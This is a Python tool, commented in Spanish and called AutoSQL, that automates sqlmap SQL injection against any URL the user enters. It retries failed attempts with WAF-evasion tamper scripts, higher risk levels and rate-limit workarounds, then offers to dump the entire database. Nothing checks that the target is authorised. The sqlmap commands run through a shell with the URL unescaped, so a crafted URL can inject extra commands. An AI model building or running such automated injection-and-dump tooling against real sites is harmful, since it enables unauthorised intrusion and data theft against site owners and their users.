#!/usr/bin/env python3
"""
AutoSQL - Sistema Inteligente de Automatización SQLMap
Versión Mejorada con Arquitectura Modular y Seguridad Reforzada
"""

import os
import sys
import subprocess
import time
import re
import threading
import itertools
import logging
import json
import signal
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path


# ============================================================================
# CONFIGURACIÓN Y CONSTANTES
# ============================================================================

class ExecutionMode(Enum):
    """Modos de ejecución disponibles."""
    FAST = "fast"
    SECURE = "secure"
    AGGRESSIVE = "aggressive"


class ExecutionStatus(Enum):
    """Estados posibles de ejecución."""
    SUCCESS = "SUCCESS"
    SUCCESS_NO_DATA = "SUCCESS_NO_DATA"
    TIMEOUT = "TIMEOUT"
    ERROR_RETURNCODE = "ERROR_RETURNCODE"
    FILE_NOT_FOUND = "FILE_NOT_FOUND"
    PERMISSION_ERROR = "PERMISSION_ERROR"
    INTERRUPTED = "INTERRUPTED"
    NETWORK_ERROR = "NETWORK_ERROR"
    WAF_DETECTED = "WAF_DETECTED"
    INVALID_TARGET = "INVALID_TARGET"


@dataclass
class ExecutionResult:
    """Resultado de una ejecución de SQLMap."""
    status: ExecutionStatus
    stdout: str = ""
    stderr: str = ""
    database_found: Optional[str] = None
    execution_time: float = 0.0
    command: str = ""


@dataclass
class AppConfig:
    """Configuración global de la aplicación."""
    target_url: str = ""
    execution_mode: ExecutionMode = ExecutionMode.FAST
    max_attempts: int = 3
    base_timeout: int = 400
    log_directory: Path = field(default_factory=lambda: Path("autosql_logs"))
    
    def validate_url(self) -> bool:
        """Valida la URL objetivo."""
        if not self.target_url:
            return False
        url_pattern = re.compile(
            r'^https?://'  # Esquema http o https
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # Dominio
            r'localhost|'  # localhost
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # IP
            r'(?::\d+)?'  # Puerto opcional
            r'(?:/?|[/?]\S+)$', re.IGNORECASE)
        return bool(url_pattern.match(self.target_url))


# ============================================================================
# SISTEMA DE LOGGING AVANZADO
# ============================================================================

class AutoSQLLogger:
    """Sistema de logging estructurado con análisis de patrones."""
    
    def __init__(self, log_dir: Path):
        self.log_dir = log_dir
        self.log_dir.mkdir(exist_ok=True)
        
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.error_history: List[Dict[str, Any]] = []
        self.success_history: List[Dict[str, Any]] = []
        
        # Configurar logger
        self.logger = logging.getLogger('autosql')
        self.logger.setLevel(logging.INFO)
        self.logger.handlers.clear()
        
        # Handler para archivo
        log_file = self.log_dir / f"autosql_{self.session_id}.log"
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setLevel(logging.DEBUG)
        
        # Formato mejorado
        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
    
    def log_command(self, command: str, attempt: int, status: str):
        """Registra ejecución de comando."""
        entry = {
            "type": "COMMAND",
            "session": self.session_id,
            "attempt": attempt,
            "status": status,
            "command": command,
            "timestamp": datetime.now().isoformat()
        }
        self.logger.info(json.dumps(entry, ensure_ascii=False))
    
    def log_error(self, error_type: str, message: str, context: Dict[str, Any]):
        """Registra errores con contexto."""
        entry = {
            "type": "ERROR",
            "session": self.session_id,
            "error_type": error_type,
            "message": message,
            "context": context,
            "timestamp": datetime.now().isoformat()
        }
        self.logger.error(json.dumps(entry, ensure_ascii=False))
        self.error_history.append(entry)
    
    def log_success(self, success_type: str, details: Dict[str, Any]):
        """Registra éxitos."""
        entry = {
            "type": "SUCCESS",
            "session": self.session_id,
            "success_type": success_type,
            "details": details,
            "timestamp": datetime.now().isoformat()
        }
        self.logger.info(json.dumps(entry, ensure_ascii=False))
        self.success_history.append(entry)
    
    def log_correction(self, original: str, corrected: str, reason: str):
        """Registra correcciones del agente IA."""
        entry = {
            "type": "CORRECTION",
            "session": self.session_id,
            "original_command": original,
            "corrected_command": corrected,
            "reason": reason,
            "timestamp": datetime.now().isoformat()
        }
        self.logger.info(json.dumps(entry, ensure_ascii=False))


# ============================================================================
# GENERADOR DE COMANDOS SQLMAP
# ============================================================================

class SQLMapCommandBuilder:
    """Constructor de comandos SQLMap con estrategias predefinidas."""
    
    @staticmethod
    def clean_command(command: str, flags_to_remove: List[str]) -> str:
        """Elimina flags específicos de un comando."""
        clean_cmd = command
        for flag in flags_to_remove:
            pattern = rf'(?:{re.escape(flag)})(?:[\s=][^\s-]*|(?=\s|$))'
            clean_cmd = re.sub(pattern, '', clean_cmd).strip()
        return re.sub(r'\s+', ' ', clean_cmd)
    
    @staticmethod
    def build_fast_command(url: str) -> str:
        """Comando rápido para detección inicial."""
        return (
            f'sqlmap -u "{url}" '
            f'--current-db --batch --banner '
            f'--time-sec=2 --threads=3 --random-agent'
        )
    
    @staticmethod
    def build_secure_command(url: str) -> str:
        """Comando con técnicas de evasión moderadas."""
        return (
            f'sqlmap -u "{url}" '
            f'--current-db --batch --banner '
            f'--tamper=between,randomcase '
            f'--level=3 --risk=1 '
            f'--time-sec=5 --random-agent'
        )
    
    @staticmethod
    def build_aggressive_command(url: str) -> str:
        """Comando agresivo con máxima detección."""
        return (
            f'sqlmap -u "{url}" '
            f'--current-db --batch --banner '
            f'--tamper=between,randomcase,charencode '
            f'--level=5 --risk=3 '
            f'--technique=BEUSTQ '
            f'--time-sec=10 --threads=5 --random-agent'
        )
    
    @staticmethod
    def build_dump_command(url: str, database: str, base_command: str) -> str:
        """Comando para volcado completo de base de datos."""
        flags_to_remove = [
            "--current-db", "--dbs", "--tables", "--columns", 
            "--dump", "--dump-all", "--banner"
        ]
        clean_cmd = SQLMapCommandBuilder.clean_command(base_command, flags_to_remove)
        return f'{clean_cmd} -D {database} --dump-all --batch --threads=10'


# ============================================================================
# AGENTE DE RAZONAMIENTO Y CORRECCIÓN
# ============================================================================

class IntelligentRepairAgent:
    """Agente IA que analiza errores y aplica correcciones contextuales."""
    
    def __init__(self, logger: AutoSQLLogger):
        self.logger = logger
        self.correction_history: List[Dict[str, str]] = []
        
        # Patrones de error categorizados
        self.error_patterns = {
            'timeout': ['timed out', 'connection timeout', 'read timeout'],
            'waf': ['waf', 'protected', 'forbidden', '403', 'blocked'],
            'not_found': ['404', 'not found', 'invalid url'],
            'injection_failed': ['not injectable', 'no vulnerable'],
            'rate_limit': ['rate limit', 'too many requests', '429'],
            'ssl_error': ['ssl', 'certificate', 'tls'],
            'dns': ['dns', 'host not found', 'name resolution'],
            'syntax': ['syntax error', 'invalid option']
        }
    
    def analyze_and_repair(
        self, 
        failed_command: str, 
        status: ExecutionStatus, 
        error_message: str
    ) -> Tuple[Optional[str], str]:
        """
        Analiza el error y retorna comando corregido o None si no puede corregir.
        
        Returns:
            (corrected_command, reason) o (None, reason) si error crítico
        """
        error_lower = error_message.lower()
        
        print("\n[🤖 AGENTE IA]: Analizando error y aplicando estrategias...")
        
        # ESTRATEGIA 1: Éxito sin datos (falso positivo)
        if status == ExecutionStatus.SUCCESS_NO_DATA:
            correction = self._apply_deep_scan_strategy(failed_command)
            reason = "Falso positivo detectado. Activando escaneo profundo."
            self._log_correction(failed_command, correction, reason)
            return correction, reason
        
        # ESTRATEGIA 2: Timeout o problemas de conexión
        if status == ExecutionStatus.TIMEOUT or self._matches_pattern(error_lower, 'timeout'):
            correction = self._apply_timeout_strategy(failed_command, error_lower)
            reason = "Timeout detectado. Incrementando tiempos de espera y persistencia."
            self._log_correction(failed_command, correction, reason)
            return correction, reason
        
        # ESTRATEGIA 3: WAF/Firewall detectado
        if self._matches_pattern(error_lower, 'waf'):
            correction = self._apply_evasion_strategy(failed_command)
            reason = "WAF detectado. Activando técnicas de evasión avanzadas."
            self._log_correction(failed_command, correction, reason)
            return correction, reason
        
        # ESTRATEGIA 4: Inyección no encontrada
        if self._matches_pattern(error_lower, 'injection_failed'):
            correction = self._apply_injection_strategy(failed_command)
            reason = "Inyección no detectada. Probando todas las técnicas disponibles."
            self._log_correction(failed_command, correction, reason)
            return correction, reason
        
        # ESTRATEGIA 5: Rate limiting
        if self._matches_pattern(error_lower, 'rate_limit'):
            correction = self._apply_rate_limit_strategy(failed_command)
            reason = "Rate limiting detectado. Reduciendo velocidad de escaneo."
            self._log_correction(failed_command, correction, reason)
            return correction, reason
        
        # ERRORES CRÍTICOS (no reparables)
        if self._matches_pattern(error_lower, 'not_found'):
            reason = "ERROR CRÍTICO: URL no encontrada o inválida."
            self.logger.log_error("CRITICAL_URL_ERROR", reason, {"command": failed_command})
            return None, reason
        
        if self._matches_pattern(error_lower, 'dns'):
            reason = "ERROR CRÍTICO: No se puede resolver el hostname."
            self.logger.log_error("DNS_ERROR", reason, {"command": failed_command})
            return None, reason
        
        # Error desconocido - análisis genérico
        reason = f"Error no categorizado: {self._analyze_generic_error(error_message)}"
        self.logger.log_error("UNKNOWN_ERROR", reason, {
            "command": failed_command,
            "error": error_message[:500]
        })
        return None, reason
    
    def _matches_pattern(self, text: str, category: str) -> bool:
        """Verifica si el texto coincide con algún patrón de la categoría."""
        return any(pattern in text for pattern in self.error_patterns.get(category, []))
    
    def _apply_deep_scan_strategy(self, command: str) -> str:
        """Estrategia para falsos positivos."""
        clean_cmd = SQLMapCommandBuilder.clean_command(
            command, 
            ["--banner", "--time-sec", "--level"]
        )
        return (
            f"{clean_cmd} "
            f"--level=4 --time-sec=20 --delay=1.5 "
            f"--retries=8 --technique=BEUSTQ"
        )
    
    def _apply_timeout_strategy(self, command: str, error_msg: str) -> str:
        """Estrategia adaptativa para timeouts."""
        clean_cmd = SQLMapCommandBuilder.clean_command(
            command,
            ["--time-sec", "--delay", "--retries", "--timeout"]
        )
        
        if "connection reset" in error_msg:
            return f"{clean_cmd} --time-sec=60 --delay=3 --retries=10 --keep-alive"
        elif "read timeout" in error_msg:
            return f"{clean_cmd} --time-sec=45 --delay=2 --retries=8"
        else:
            return f"{clean_cmd} --time-sec=30 --delay=1.5 --retries=6"
    
    def _apply_evasion_strategy(self, command: str) -> str:
        """Estrategia de evasión progresiva para WAF."""
        clean_cmd = SQLMapCommandBuilder.clean_command(
            command,
            ["--tamper", "--random-agent", "--level", "--risk"]
        )
        
        if "--tamper=" not in command:
            # Primera capa de evasión
            return (
                f"{clean_cmd} "
                f"--tamper=between,randomcase,charencode "
                f"--random-agent --level=5 --risk=2"
            )
        else:
            # Evasión avanzada
            return (
                f"{clean_cmd} "
                f"--tamper=space2comment,between,randomcase "
                f"--level=5 --risk=3 --delay=2"
            )
    
    def _apply_injection_strategy(self, command: str) -> str:
        """Estrategia para inyección no detectada."""
        clean_cmd = SQLMapCommandBuilder.clean_command(
            command,
            ["--technique", "--level", "--risk"]
        )
        return (
            f"{clean_cmd} "
            f"--technique=BEUSTQ --level=5 --risk=3 "
            f"--time-sec=25 --threads=5"
        )
    
    def _apply_rate_limit_strategy(self, command: str) -> str:
        """Estrategia para rate limiting."""
        clean_cmd = SQLMapCommandBuilder.clean_command(
            command,
            ["--delay", "--retries", "--time-sec"]
        )
        return f"{clean_cmd} --delay=5 --retries=3 --time-sec=60 --random-agent"
    
    def _analyze_generic_error(self, error: str) -> str:
        """Análisis genérico de errores no categorizados."""
        error_lower = error.lower()
        
        if "permission" in error_lower or "denied" in error_lower:
            return "Problema de permisos o acceso."
        elif "memory" in error_lower:
            return "Problema de memoria insuficiente."
        elif "python" in error_lower or "import" in error_lower:
            return "Error en la instalación de SQLMap."
        elif "network" in error_lower or "socket" in error_lower:
            return "Problema de red o conectividad."
        else:
            return "Error técnico no identificado."
    
    def _log_correction(self, original: str, corrected: str, reason: str):
        """Registra la corrección aplicada."""
        self.logger.log_correction(original, corrected, reason)
        self.correction_history.append({
            "original": original,
            "corrected": corrected,
            "reason": reason,
            "timestamp": datetime.now().isoformat()
        })


# ============================================================================
# EJECUTOR DE COMANDOS CON THREADING
# ============================================================================

class SQLMapExecutor:
    """Ejecutor de comandos SQLMap con manejo de hilos y progreso."""
    
    def __init__(self, logger: AutoSQLLogger):
        self.logger = logger
        self.process_running = False
        self.result: Optional[ExecutionResult] = None
        self.thread: Optional[threading.Thread] = None
        self.start_time = 0.0
    
    def execute_with_progress(
        self, 
        command: str, 
        timeout: int = 400
    ) -> ExecutionResult:
        """Ejecuta comando mostrando progreso en tiempo real."""
        print(f"\n→ Ejecutando: {command}\n")
        
        self.result = ExecutionResult(
            status=ExecutionStatus.SUCCESS,
            command=command
        )
        self.start_time = time.time()
        
        # Iniciar hilo de ejecución
        self.thread = threading.Thread(
            target=self._run_sqlmap,
            args=(command, timeout)
        )
        self.thread.start()
        
        # Mostrar progreso
        self._show_progress()
        
        # Esperar finalización
        if self.thread.is_alive():
            self.thread.join()
        
        # Calcular tiempo de ejecución
        self.result.execution_time = time.time() - self.start_time
        
        return self.result
    
    def _run_sqlmap(self, command: str, timeout: int):
        """Ejecuta SQLMap en hilo separado."""
        self.process_running = True
        
        try:
            self.logger.log_command(command, 1, "EXECUTING")
            
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            
            self.result.stdout = process.stdout
            self.result.stderr = process.stderr
            
            # Analizar resultado
            self._analyze_result(process.returncode, process.stdout, process.stderr)
            
        except subprocess.TimeoutExpired as e:
            self.result.status = ExecutionStatus.TIMEOUT
            self.result.stderr = f"Timeout después de {timeout}s"
            if e.stdout:
                self.result.stdout = e.stdout.decode('utf-8', errors='ignore')
            
        except FileNotFoundError:
            self.result.status = ExecutionStatus.FILE_NOT_FOUND
            self.result.stderr = "SQLMap no encontrado en el sistema"
            
        except Exception as e:
            self.result.status = ExecutionStatus.ERROR_RETURNCODE
            self.result.stderr = f"Error inesperado: {type(e).__name__}: {str(e)}"
            
        finally:
            self.process_running = False
            self.logger.log_command(command, 1, self.result.status.value)
    
    def _analyze_result(self, returncode: int, stdout: str, stderr: str):
        """Analiza el resultado de la ejecución."""
        stdout_lower = stdout.lower()
        
        if returncode == 0:
            # Verificar si se encontró base de datos
            if any(kw in stdout_lower for kw in ['current database', 'available databases']):
                self.result.status = ExecutionStatus.SUCCESS
                
                # Extraer nombre de base de datos
                match = re.search(r"current database: '([^']+)'", stdout_lower)
                if match:
                    self.result.database_found = match.group(1)
                
                self.logger.log_success("DATABASE_FOUND", {
                    "database": self.result.database_found,
                    "output_length": len(stdout)
                })
            elif not stdout.strip() or "no parameter" in stdout_lower:
                self.result.status = ExecutionStatus.SUCCESS_NO_DATA
            else:
                self.result.status = ExecutionStatus.SUCCESS
        else:
            self.result.status = ExecutionStatus.ERROR_RETURNCODE
            self.logger.log_error(
                f"SQLMAP_ERROR_CODE_{returncode}",
                stderr,
                {"returncode": returncode}
            )
    
    def _show_progress(self):
        """Muestra barra de progreso animada."""
        symbols = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        
        print("\n" * 3)  # Espacio para el bloque de progreso
        
        while self.process_running:
            elapsed = time.time() - self.start_time
            symbol = next(symbols)
            
            # Imprimir progreso (sobrescribir línea)
            sys.stdout.write(f'\r{symbol} Ejecutando SQLMap... Tiempo: {elapsed:.1f}s')
            sys.stdout.flush()
            time.sleep(0.1)
        
        # Limpiar progreso
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        sys.stdout.flush()
        
        print("\n╭─────────────────────────────────╮")
        print("│  PROCESO SQLMAP FINALIZADO  │")
        print("╰─────────────────────────────────╯\n")


# ============================================================================
# AGENTE PRINCIPAL DE REPARACIÓN
# ============================================================================

class MainRepairAgent:
    """Agente principal que coordina el ciclo de ejecución y reparación."""
    
    def __init__(self, config: AppConfig, logger: AutoSQLLogger):
        self.config = config
        self.logger = logger
        self.executor = SQLMapExecutor(logger)
        self.repair_agent = IntelligentRepairAgent(logger)
        self.command_builder = SQLMapCommandBuilder()
    
    def execute_scan(self) -> Optional[str]:
        """
        Ejecuta el escaneo completo con reintentos inteligentes.
        
        Returns:
            Nombre de la base de datos si se encuentra, None en caso contrario.
        """
        if not self.config.validate_url():
            print(f"❌ ERROR: URL inválida: {self.config.target_url}")
            return None
        
        self._print_header()
        
        # Generar comando inicial según modo
        current_command = self._get_initial_command()
        
        print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("  FASE 1: BÚSQUEDA DE BASE DE DATOS")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        
        # Ciclo de reintentos
        for attempt in range(1, self.config.max_attempts + 1):
            print(f"\n╔══════════════════╗")
            print(f"║  INTENTO {attempt}/{self.config.max_attempts}  ║")
            print(f"╚══════════════════╝")
            
            # Ejecutar comando
            result = self.executor.execute_with_progress(
                current_command,
                self.config.base_timeout
            )
            
            # Mostrar salida
            self._display_output(result)
            
            # Verificar éxito
            if result.status == ExecutionStatus.SUCCESS and result.database_found:
                self._handle_success(result)
                return result.database_found
            
            # Intentar reparación si no es el último intento
            if attempt < self.config.max_attempts:
                corrected_command, reason = self.repair_agent.analyze_and_repair(
                    current_command,
                    result.status,
                    result.stderr or result.stdout
                )
                
                if corrected_command is None:
                    print(f"\n❌ ERROR CRÍTICO: {reason}")
                    print("   No se puede continuar con el escaneo.")
                    break
                
                print(f"\n{'='*60}")
                print(f"✓ CORRECCIÓN APLICADA:")
                print(f"  Razón: {reason}")
                print(f"  Nuevo comando: {corrected_command}")
                print(f"{'='*60}")
                
                current_command = corrected_command
                time.sleep(2)
            else:
                print("\n❌ Máximo de intentos alcanzado sin éxito.")
                self._analyze_final_failure(result)
        
        return None
    
    def dump_database(self, database_name: str, base_command: str):
        """Ejecuta volcado completo de la base de datos."""
        print("\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("  FASE 2: VOLCADO COMPLETO DE DATOS")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        
        dump_command = self.command_builder.build_dump_command(
            self.config.target_url,
            database_name,
            base_command
        )
        
        print(f"→ Base de datos objetivo: {database_name}")
        print(f"→ Comando: {dump_command}\n")
        
        result = self.executor.execute_with_progress(dump_command, timeout=1200)
        
        self._display_output(result)
        
        if result.status == ExecutionStatus.SUCCESS:
            print("\n✅ VOLCADO COMPLETADO EXITOSAMENTE")
            print(f"   Tiempo de ejecución: {result.execution_time:.2f}s")
        else:
            print("\n❌ FALLO EN EL VOLCADO")
            print(f"   Estado: {result.status.value}")
    
    def _get_initial_command(self) -> str:
        """Obtiene el comando inicial según el modo configurado."""
        url = self.config.target_url
        
        if self.config.execution_mode == ExecutionMode.FAST:
            return self.command_builder.build_fast_command(url)
        elif self.config.execution_mode == ExecutionMode.SECURE:
            return self.command_builder.build_secure_command(url)
        else:  # AGGRESSIVE
            return self.command_builder.build_aggressive_command(url)
    
    def _print_header(self):
        """Imprime encabezado de ejecución."""
        print("\n╔═══════════════════════════════════════════════╗")
        print(f"║  MODO: {self.config.execution_mode.value.upper():<38} ║")
        print(f"║  URL:  {self.config.target_url[:38]:<38} ║")
        print("╚═══════════════════════════════════════════════╝")
    
    def _display_output(self, result: ExecutionResult):
        """Muestra la salida del comando."""
        print("\n" + "─" * 70)
        print("SALIDA DE SQLMAP:")
        print("─" * 70)
        
        if result.stdout:
            # Mostrar solo las partes relevantes
            lines = result.stdout.split('\n')
            relevant_lines = [
                line for line in lines 
                if any(kw in line.lower() for kw in [
                    'database', 'injectable', 'parameter', 'target', 
                    'vulnerable', 'error', 'warning'
                ])
            ]
            print('\n'.join(relevant_lines[:30]))  # Limitar salida
        
        if result.stderr:
            print(f"\nERRORES/ADVERTENCIAS:\n{result.stderr[:500]}")
        
        print("─" * 70)
    
    def _handle_success(self, result: ExecutionResult):
        """Maneja el caso de éxito."""
        print("\n" + "═" * 70)
        print(f"  ✅ ÉXITO: Base de datos encontrada")
        print(f"  📦 Database: {result.database_found}")
        print(f"  ⏱️  Tiempo: {result.execution_time:.2f}s")
        print("═" * 70)
    
    def _analyze_final_failure(self, result: ExecutionResult):
        """Analiza y muestra información sobre el fallo final."""
        print("\n" + "─" * 70)
        print("ANÁLISIS DE FALLO:")
        print("─" * 70)
        
        error_msg = (result.stderr or result.stdout).lower()
        
        if "timeout" in error_msg:
            print("• Causa: Timeout - El servidor no responde en tiempo razonable")
            print("• Sugerencia: Verificar conectividad o usar VPN")
        elif "waf" in error_msg or "forbidden" in error_msg:
            print("• Causa: WAF/Firewall - Protección activa detectada")
            print("• Sugerencia: Requiere técnicas de evasión más avanzadas")
        elif "not injectable" in error_msg:
            print("• Causa: No se encontraron puntos de inyección")
            print("• Sugerencia: El objetivo puede no ser vulnerable")
        else:
            print(f"• Causa: Error técnico - {result.status.value}")
            print("• Sugerencia: Revisar logs para más detalles")
        
        print("─" * 70)


# ============================================================================
# INTERFAZ DE USUARIO
# ============================================================================

class UserInterface:
    """Interfaz de menú interactivo mejorada."""
    
    MENU_OPTIONS = ["INICIAR ESCANEO", "CONFIGURACIÓN", "VER LOGS", "SALIR"]
    CURSOR = "→"
    BLANK = " " * len(CURSOR)
    
    def __init__(self, config: AppConfig):
        self.config = config
        self.selected_index = 0
    
    def run(self):
        """Ejecuta el bucle principal del menú."""
        while True:
            self._clear_screen()
            self._draw_menu()
            
            try:
                key = self._getch()
            except KeyboardInterrupt:
                print("\n\n👋 Saliendo...")
                break
            
            # Navegación
            if key in ['\x1b[A', 'w', 'W']:  # Arriba
                self.selected_index = (self.selected_index - 1) % len(self.MENU_OPTIONS)
            elif key in ['\x1b[B', 's', 'S']:  # Abajo
                self.selected_index = (self.selected_index + 1) % len(self.MENU_OPTIONS)
            elif key in ['\r', '\n', 'e', 'E']:  # Enter
                self._handle_selection()
            elif key in ['q', 'Q']:  # Quit
                break
    
    def _draw_menu(self):
        """Dibuja el menú principal."""
        banner = r"""
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║     █████╗ ██╗   ██╗████████╗ ██████╗ ███████╗ ██████╗██╗     ║
    ║    ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔════╝██╔═══██╗██║     ║
    ║    ███████║██║   ██║   ██║   ██║   ██║███████╗██║   ██║██║     ║
    ║    ██╔══██║██║   ██║   ██║   ██║   ██║╚════██║██║▄▄ ██║██║     ║
    ║    ██║  ██║╚██████╔╝   ██║   ╚██████╔╝███████║╚██████╔╝███████╗║
    ║    ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝║
    ║                                                       ║
    ║          Sistema Inteligente de SQLMap Automation    ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
        """
        print(banner)
        
        # Información de configuración
        print(f"\n    ┌─────────────────────────────────────────────────┐")
        print(f"    │  URL:  {self.config.target_url[:40]:<40} │")
        print(f"    │  MODO: {self.config.execution_mode.value.upper():<40} │")
        print(f"    └─────────────────────────────────────────────────┘\n")
        
        # Opciones de menú
        print("    ╔═════════════════════════════════════════════════╗")
        for i, option in enumerate(self.MENU_OPTIONS):
            prefix = self.CURSOR if i == self.selected_index else self.BLANK
            print(f"    ║  {prefix} {i+1}. {option:<41} ║")
        print("    ╚═════════════════════════════════════════════════╝")
        
        print("\n    Controles: ↑/W Arriba | ↓/S Abajo | Enter/E Seleccionar | Q Salir")
    
    def _handle_selection(self):
        """Maneja la selección del usuario."""
        self._clear_screen()
        choice = self.MENU_OPTIONS[self.selected_index]
        
        if choice == "INICIAR ESCANEO":
            self._handle_scan()
        elif choice == "CONFIGURACIÓN":
            self._handle_settings()
        elif choice == "VER LOGS":
            self._handle_view_logs()
        elif choice == "SALIR":
            print("\n👋 Saliendo del sistema...")
            sys.exit(0)
        
        input("\n\n[Presiona Enter para continuar...]")
    
    def _handle_scan(self):
        """Inicia el escaneo."""
        if not self.config.target_url:
            print("❌ ERROR: Debe configurar una URL objetivo primero.")
            return
        
        logger = AutoSQLLogger(self.config.log_directory)
        agent = MainRepairAgent(self.config, logger)
        
        database = agent.execute_scan()
        
        if database:
            print(f"\n\n{'='*70}")
            print(f"✅ Base de datos encontrada: {database}")
            print(f"{'='*70}")
            
            # Preguntar por volcado
            choice = input("\n¿Desea volcar toda la base de datos? [S/n]: ").strip().lower()
            
            if choice in ['s', 'si', 'yes', 'y', '']:
                agent.dump_database(database, agent.executor.result.command)
            else:
                print("\n→ Volcado cancelado. Regresando al menú...")
    
    def _handle_settings(self):
        """Maneja la configuración."""
        print("╔═══════════════════════════════════════════════════╗")
        print("║              CONFIGURACIÓN DE AUTOSQL             ║")
        print("╚═══════════════════════════════════════════════════╝\n")
        
        # Configurar URL
        print(f"URL actual: {self.config.target_url or 'No configurada'}")
        new_url = input("Nueva URL (Enter para mantener): ").strip()
        
        if new_url:
            self.config.target_url = new_url
            if self.config.validate_url():
                print("✓ URL válida y configurada")
            else:
                print("⚠ Advertencia: La URL puede no ser válida")
        
        # Configurar modo
        print(f"\n\nModo actual: {self.config.execution_mode.value.upper()}")
        print("\nModos disponibles:")
        print("  [1] FAST      - Escaneo rápido (recomendado para pruebas)")
        print("  [2] SECURE    - Escaneo con evasión moderada")
        print("  [3] AGGRESSIVE- Escaneo exhaustivo (puede ser detectado)")
        
        mode_choice = input("\nSeleccione modo [1-3] (Enter para mantener): ").strip()
        
        if mode_choice == '1':
            self.config.execution_mode = ExecutionMode.FAST
        elif mode_choice == '2':
            self.config.execution_mode = ExecutionMode.SECURE
        elif mode_choice == '3':
            self.config.execution_mode = ExecutionMode.AGGRESSIVE
        
        # Configurar reintentos
        print(f"\n\nReintentos máximos: {self.config.max_attempts}")
        tries = input("Nuevos reintentos [1-10] (Enter para mantener): ").strip()
        
        if tries.isdigit() and 1 <= int(tries) <= 10:
            self.config.max_attempts = int(tries)
        
        print("\n✅ Configuración guardada")
    
    def _handle_view_logs(self):
        """Muestra los logs recientes."""
        print("╔═══════════════════════════════════════════════════╗")
        print("║                  LOGS RECIENTES                   ║")
        print("╚═══════════════════════════════════════════════════╝\n")
        
        log_files = sorted(self.config.log_directory.glob("*.log"), reverse=True)
        
        if not log_files:
            print("No hay logs disponibles.")
            return
        
        print("Logs disponibles:\n")
        for i, log_file in enumerate(log_files[:10], 1):
            size_kb = log_file.stat().st_size / 1024
            mtime = datetime.fromtimestamp(log_file.stat().st_mtime)
            print(f"  [{i}] {log_file.name}")
            print(f"      Tamaño: {size_kb:.2f} KB | Fecha: {mtime.strftime('%Y-%m-%d %H:%M:%S')}")
        
        choice = input("\n\nSeleccione número de log para ver [1-10] (Enter para cancelar): ").strip()
        
        if choice.isdigit() and 1 <= int(choice) <= min(10, len(log_files)):
            selected_log = log_files[int(choice) - 1]
            print(f"\n{'='*70}")
            print(f"LOG: {selected_log.name}")
            print('='*70)
            
            with open(selected_log, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                # Mostrar últimas 50 líneas
                for line in lines[-50:]:
                    print(line.rstrip())
            
            print('='*70)
    
    @staticmethod
    def _clear_screen():
        """Limpia la pantalla."""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def _getch():
        """Captura una tecla sin esperar Enter."""
        try:
            if os.name == 'nt':
                import msvcrt
                return msvcrt.getch().decode('utf-8', errors='ignore')
            else:
                import tty
                import termios
                fd = sys.stdin.fileno()
                old_settings = termios.tcgetattr(fd)
                try:
                    tty.setraw(fd)
                    ch = sys.stdin.read(1)
                    return ch
                finally:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        except Exception:
            return input()


# ============================================================================
# PUNTO DE ENTRADA PRINCIPAL
# ============================================================================

def verify_dependencies():
    """Verifica que SQLMap esté instalado."""
    try:
        result = subprocess.run(
            "sqlmap --version",
            shell=True,
            capture_output=True,
            timeout=5
        )
        if result.returncode != 0:
            raise FileNotFoundError
        return True
    except Exception:
        print("\n" + "="*70)
        print("❌ ERROR CRÍTICO: SQLMap no está instalado o no está en PATH")
        print("="*70)
        print("\nPara instalar SQLMap:")
        print("  • Linux/Mac: sudo apt install sqlmap  o  brew install sqlmap")
        print("  • Windows: Descargar desde https://sqlmap.org/")
        print("\nVerifique que 'sqlmap' sea accesible desde la terminal.")
        print("="*70)
        return False


def main():
    """Función principal."""
    print("\n")
    print("╔═══════════════════════════════════════════════════════╗")
    print("║                                                       ║")
    print("║              🚀 Iniciando AutoSQL v2.0 🚀            ║")
    print("║                                                       ║")
    print("╚═══════════════════════════════════════════════════════╝")
    print("\n")
    
    # Verificar dependencias
    if not verify_dependencies():
        sys.exit(1)
    
    # Crear configuración
    config = AppConfig()
    
    # Manejo de señales
    def signal_handler(sig, frame):
        print("\n\n👋 Interrupción detectada. Saliendo limpiamente...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Iniciar interfaz
    try:
        ui = UserInterface(config)
        ui.run()
    except Exception as e:
        print(f"\n❌ Error inesperado: {type(e).__name__}: {str(e)}")
        sys.exit(1)
    
    print("\n\n✅ AutoSQL finalizado correctamente.\n")


if __name__ == "__main__":
    main()
